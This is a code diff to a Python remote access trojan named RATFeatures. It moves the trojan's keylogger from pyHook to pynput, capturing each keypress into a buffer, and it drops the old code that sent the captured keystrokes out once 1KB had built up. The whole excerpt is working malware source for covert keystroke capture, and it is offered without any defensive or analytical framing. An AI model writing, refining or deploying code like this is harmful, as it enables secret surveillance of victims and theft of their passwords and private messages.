@@ -20,7 +20,8 @@ import win32con
 import win32api
 from io import BytesIO
 from PIL import ImageGrab
-import pyHook
+from pynput.keyboard import Listener as KeyboardListener
+import pynput
 import pythoncom
 
 # ======================
@@ -125,27 +126,21 @@ class RATFeatures:
             return f"Error: {str(e)}"
 
     def start_keylogger(self):
-        def OnKeyboardEvent(event):
-            self.keylogger_buffer += chr(event.Ascii)
-            if len(self.keylogger_buffer) > 1024:  # Send every 1KB
-                self.send_keylog_data()
-            return True
+        def on_press(key):
+            try:
+                self.keylogger_buffer += str(key.char)
+            except AttributeError:
+                self.keylogger_buffer += f"[{str(key)}]"
 
-        self.hook_manager = pyHook.HookManager()
-        self.hook_manager.KeyDown = OnKeyboardEvent
-        self.hook_manager.HookKeyboard()
+        self.listener = KeyboardListener(on_press=on_press)
+        self.listener.start()
         self.keylogger_active = True
-        
-        # Start message pump in a separate thread
-        threading.Thread(target=self.keylogger_thread).start()
-        return "Keylogger started"
+        return "Keylogger started (pynput version)"
 
     def stop_keylogger(self):
-        if self.hook_manager:
-            self.hook_manager.UnhookKeyboard()
+        if hasattr(self, 'listener'):
+            self.listener.stop()
         self.keylogger_active = False
-        if self.keylogger_buffer:
-            self.send_keylog_data()
         return "Keylogger stopped"
 
     def keylogger_thread(self):
